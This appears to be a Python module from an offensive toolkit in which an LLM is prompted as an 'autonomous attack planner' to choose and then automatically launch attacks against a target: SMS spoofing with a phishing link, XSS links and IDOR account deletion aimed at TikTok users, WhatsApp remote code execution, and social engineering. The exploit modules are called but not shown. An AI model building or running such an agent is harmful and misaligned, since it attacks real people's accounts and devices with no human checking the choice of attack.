import json
import groq
import google.generativeai as genai
from config import GROQ_API_KEY, GOOGLE_API_KEY
from modules.utils import logger

class AIAnalyzer:
    def __init__(self, orchestrator):
        self.orchestrator = orchestrator
        self.groq_client = groq.Groq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None
        self.gemini_model = None
        if GOOGLE_API_KEY:
            genai.configure(api_key=GOOGLE_API_KEY)
            self.gemini_model = genai.GenerativeModel('gemini-1.5-flash')

    def _call_llm(self, prompt, max_tokens=400, temperature=0.2):
        if self.groq_client:
            try:
                response = self.groq_client.chat.completions.create(
                    model="llama3-70b-8192",
                    messages=[{"role": "user", "content": prompt}],
                    temperature=temperature,
                    max_tokens=max_tokens
                )
                return response.choices[0].message.content
            except Exception as e:
                logger.warning(f"Groq failed: {e}. Falling back to Gemini.")
        if self.gemini_model:
            try:
                response = self.gemini_model.generate_content(prompt)
                return response.text
            except Exception as e:
                logger.error(f"Gemini also failed: {e}")
                raise RuntimeError("Both AI providers failed.")
        raise RuntimeError("No AI API key configured.")

    def analyze_and_act(self, target_id, target_data):
        raw = ''  # Initialize to avoid reference error
        prompt = f"""
You are an autonomous attack planner. You MUST output a single JSON object with:
- "best_attack": one of ["sms_spoof", "xss_link", "idor_delete", "wa_rce", "social_engineering"]
- "reasoning": short explanation
- "parameters": dict (e.g., {{"phone": "+1234567890", "email": "target@example.com", "username": "victim", "account_id": "123"}})

Target data: {json.dumps(target_data)}
Output ONLY JSON. No extra text.
"""
        try:
            raw = self._call_llm(prompt, max_tokens=300, temperature=0.3)
            result = json.loads(raw)
        except Exception as e:
            logger.error(f"AI parsing failed: {e}. Raw: {raw[:200] if raw else 'empty'}")
            return {"error": "AI output invalid", "raw": raw[:200] if raw else ''}

        attack = result.get("best_attack")
        params = result.get("parameters", {})
        exec_result = self._execute_attack(target_id, attack, params)
        result['execution_result'] = exec_result
        self.orchestrator.log_attack(target_id, attack, exec_result)
        return result

    def _execute_attack(self, target_id, attack_type, params):
        if attack_type == 'sms_spoof':
            return self.orchestrator.tiktok_sms.exploit(params.get('phone'), 'http://phishing.link')
        elif attack_type == 'xss_link':
            return self.orchestrator.tiktok_xss.exploit(params.get('username'), params.get('email'))
        elif attack_type == 'idor_delete':
            return self.orchestrator.tiktok_idor.exploit(params.get('account_id'))
        elif attack_type == 'wa_rce':
            return self.orchestrator.wa_rce.exploit(params.get('phone'))
        elif attack_type == 'social_engineering':
            return self.orchestrator.social_engineer(params)
        else:
            return {'success': False, 'output': f'Unknown attack type: {attack_type}'}
